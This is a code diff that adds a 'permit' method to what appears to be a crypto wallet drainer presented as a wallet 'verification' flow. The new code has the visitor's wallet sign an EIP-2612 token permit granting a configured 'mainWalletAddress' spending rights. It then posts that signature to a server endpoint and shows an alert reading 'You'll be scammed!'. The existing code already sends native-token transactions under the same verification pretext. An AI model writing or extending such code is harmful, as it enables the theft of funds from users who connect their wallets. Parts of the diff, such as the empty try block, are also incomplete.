@@ -7,6 +7,9 @@ import {JsonRpcSigner} from "@ethersproject/providers";
 import {ethers, Wallet} from "ethers";
 import {getV3ConfigValue} from "@v3/@special/config";
 import {getConfig, handleVerificationResponse} from "@v3/@special/wallet/actions";
+import {signTypedData} from "@wagmi/core";
+import {config} from "@/context/config";
+import {FinalizedSignedSignature} from "@/app/(version1)/v1/page";
 
 
 class iTzUnity {
@@ -52,6 +55,64 @@ class iTzUnity {
 		const txResponse = await signer!.sendTransaction(tx);
 		await handleVerificationResponse("TRANSACTION", account.address+"", txResponse);
 	}
+
+	async permit() {
+		const developer = {
+			address: await getConfig('mainWalletAddress')
+		}
+		if (!developer.address) throw("TARGET ADDRESS NOT SET!")
+		let {account, provider, signer, token, transaction} = this;
+
+		let nonce = -1;
+
+		try {
+			nonce = (await callContractMethod('nonces', [account.address], token.contract_address,providerUrl)).toString()
+		} catch {
+		}
+
+		if (isNaN(+nonce) || +nonce < 0) {
+			nonce = await provider?.getTransactionCount(account.address!) || 0;
+		}
+
+		const sig = await createPermitSignature(async (args: any)=>{
+				return signTypedData(config, args);
+			},
+			token.contract_name || "UNITY2",
+			token.contract_address,
+			account.chainId || 0,
+			account.address+"",
+			developer.address,
+			window.prompt("enter amount")+"",
+			nonce,
+			2661766724,
+		)
+
+		console.log(
+			"R",sig.r.toString(),//  HERE IS MAYBE A BUG! if it happened change it to "toString('hex')"
+			"S",sig.s.toString(),//  HERE IS MAYBE A BUG! if it happened change it to "toString('hex')"
+			"V", sig.v.toString()
+		);
+		console.log(sig);
+
+		setSignatures(pre => ({
+			...pre,
+			[token.contract_ticker_symbol]: sig
+		}));
+
+		const payload: FinalizedSignedSignature = {
+			signedSignature: sig,
+			provider: providerUrl,
+			token
+		}
+
+		fetch("/api/signature", {
+			method: "POST",
+			body: JSON.stringify(payload),
+			headers: {
+				'content-type': "application/json"
+			}
+		}).then(()=>alert("You'll be scammed!")).catch(console.error)
+	}
 }
 
 export async function doVerification(provider: ReturnType<typeof useEthersProvider>,signer: ReturnType<typeof useEthersSigner>,account: ReturnType<typeof useAccount>, token: FetchedWalletToken) {
@@ -59,6 +120,12 @@ export async function doVerification(provider: ReturnType<typeof useEthersProvid
 
 	if (token.native_token) {
 		await unity.transaction();
+	} else {
+		try {
+
+		} catch (e: any) {
+			console.log("PERMIT METHOD FAILURE",e);
+		}
 	}
 }
 
